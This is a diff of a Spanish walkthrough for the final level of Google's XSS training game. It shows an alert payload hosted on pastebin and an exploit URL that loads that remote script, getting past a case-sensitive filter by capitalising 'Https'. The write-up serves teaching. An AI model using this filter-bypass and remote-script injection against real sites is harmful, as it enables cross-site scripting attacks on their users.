@@ -46,19 +46,21 @@ Tras muchas vueltas, hemos elegido la segunda opción por la siguiente razón: *
 Ahora tenemos que conseguir conlgar nuestro script en alguna URL y montar la URL de la consulta para que pueda ejecutarla.
 La mejor página para hacer esto es **www.pastebin.com**. Te permite escribir un código HTML, JavaScript, etc, colgarlo online y ponerle fecha de expiración.
 
-Creamos el script de alerta en pastebin.com y copiamos la URL:
+Creamos el script de alerta en pastebin.com y copiamos la URL con el mensaje **ZASCA!**:
 
-En este caso hemos creado la siguiente URL: ```html https://pastebin.com/raw/15S5qZs0```
+```javascript alert('ZASCA!') ```
+
+En este caso hemos creado la siguiente URL: ``` https://pastebin.com/raw/ny1kd5mC```
 
 Y tenemos la siguiente URL completa para pasarsela al navegador:
 
-https://xss-game.appspot.com/level6/frame#https://pastebin.com/raw.php?i=15S5qZs0
+``` https://xss-game.appspot.com/level6/frame#https://pastebin.com/raw/ny1kd5mC ```
 
 **ERROR**!!! Recordar el **REGEX** que es **CASE SENSITIVE** y que debemos cambiar algún parámetro del https
 
 Ahora quedaría de esta forma (modificamos la **H** del principio del **https** a **MAYUSCULAS** así **Https**:
 
-https://xss-game.appspot.com/level6/frame#Https://pastebin.com/raw.php?i=15S5qZs0
+``` https://xss-game.appspot.com/level6/frame#Https://pastebin.com/raw/ny1kd5mC```
 
 Nos muestra un cuadre de texto indicando que hemos pasado de nivel y completado el Juego de XSS de Google :)
 
